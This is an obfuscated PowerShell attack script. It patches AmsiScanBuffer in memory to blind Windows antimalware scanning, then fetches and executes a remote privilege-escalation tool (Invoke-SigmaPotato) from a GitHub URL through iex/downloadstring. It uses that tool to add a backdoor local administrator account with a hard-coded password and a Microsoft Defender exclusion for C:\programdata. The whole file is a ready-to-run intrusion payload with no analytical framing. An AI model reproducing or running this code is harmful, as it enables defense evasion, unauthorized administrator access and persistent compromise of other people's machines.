#Rasta-mouses Amsi-Scan-Buffer patch \n
$PPA9HSnMMqS = @"
using System;
using System.Runtime.InteropServices;
public class PPA9HSnMMqS {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr pAT3LwjU5MIY1, string otkXAKC5);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr mRYYwbX, UIntPtr o7Vwq2ROZv, uint iqdzLzklg8Z0Vi405Dw, out uint iVSS_a);
}
"@

Add-Type $PPA9HSnMMqS

$CjK = [PPA9HSnMMqS]::LoadLibrary("$(('âmsí'+'.dll').nORmALIze([CHAR](70*26/26)+[CHaR]([BYTe]0x6f)+[cHAr](114)+[char]([bytE]0x6d)+[CHAr](35+33)) -replace [CHAR]([bYtE]0x5c)+[CHaR]([ByTE]0x70)+[char](123)+[CHaR](77+25-25)+[chaR]([ByTE]0x6e)+[chAr]([BYtE]0x7d))")
$tt2yuPou9 = [PPA9HSnMMqS]::GetProcAddress($CjK, "$([CHAR]([ByTE]0x41)+[cHAR]([byTe]0x6d)+[CHar](115+73-73)+[ChAr]([BYTe]0x69)+[CHaR](83*41/41)+[cHAr]([Byte]0x63)+[chAR]([bYTE]0x61)+[CHaR](110)+[cHAR]([bYtE]0x42)+[Char]([byte]0x75)+[char]([byte]0x66)+[ChaR]([BYte]0x66)+[chAR]([bYTE]0x65)+[cHAr]([BYtE]0x72))")
$p = 0
[PPA9HSnMMqS]::VirtualProtect($tt2yuPou9, [uint32]5, 0x40, [ref]$p)
$Uzh = "0xB8"
$wSUZmgR1K5y8T = "0x57"
$lBWO9QnwXfH32n4xw2 = "0x00"
$IW86Sgwb = "0x07"
$R2ZWo = "0x80"
$UX8PXCUfK = "0xC3"
$VszJa5BksrHH0B7H = [Byte[]] ($Uzh,$wSUZmgR1K5y8T,$lBWO9QnwXfH32n4xw2,$IW86Sgwb,+$R2ZWo,+$UX8PXCUfK)
[System.Runtime.InteropServices.Marshal]::Copy($VszJa5BksrHH0B7H, 0, $tt2yuPou9, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"





